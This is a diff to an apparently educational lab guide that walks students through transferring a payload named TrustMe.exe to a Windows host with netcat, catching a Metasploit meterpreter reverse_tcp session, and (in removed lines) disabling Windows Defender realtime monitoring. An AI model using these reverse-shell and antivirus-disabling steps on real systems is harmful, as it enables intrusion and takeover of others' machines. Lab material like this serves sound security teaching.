@@ -47,22 +47,25 @@ Please note, the adhd password is adhd.
 
 \#`ls -l TrustMe.exe`
 
-\#`python -m SimpleHTTPServer 8000 &`
-
-It should look like this:
-
-![](attachments\Clipboard_2020-07-09-15-52-24.png)
+/#`nc -l -p 2222 < TrustMe.exe`
 
 Now, let's start the Metasploit Handler.  You will have to hit Enter to get your prompt back.
 
 
 root@DESKTOP-I1T2G01:/tmp# `msfconsole -q`
+
 msf5 > `use exploit/multi/handler`
+
 msf5 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`
+
 PAYLOAD => windows/meterpreter/reverse_tcp
+
 msf5 exploit(multi/handler) > `set LHOST 172.26.19.133`
+
 Remember, your IP will be different!
+
 msf5 exploit(multi/handler) > `exploit`
+
 
 It should look like this:
 
@@ -93,26 +96,21 @@ It should look like this:
 ![](attachments\Clipboard_2020-06-15-10-43-37.png)
 
 
-Now, let’s surf to your Linux system, download the malware and run it!
+let's run the following commands to copy over and run the TrustMe.exe file.
 
-Simply open an edge browser to `http://<YOUR LINUX IP>:8000`
+`cd \tools`
 
-![](attachments\Clipboard_2020-07-09-15-54-29.png)
+`nc <Your Linux IP> 2222 > TrustMe.exe`
 
-Remember! Your IP will be different!!
+Take a deep breath.  Count to 5.  Then hit Ctrl+c to kill the connection.
 
-Now, let's download and run the TrustMe.exe file!
+Then, run it.
 
-![](attachments\Clipboard_2020-07-09-15-55-05.png)
-You should simply click and run the program from the browser.
+`TrustMe.exe`
 
-If you get an alert, just select run the application.
+It should look like this:
 
-If you get a Windows Defender error when trying to launch this program, simply run the following from an Administrator PowerShell prompt:
-
-`Set-MpPreference -DisableRealtimeMonitoring $true`
-
-This will disable Defender for this session.
+![](attachments/TrustMe.png)
 
 
 Back at your Ubuntu prompt, you should have a metasploit session!
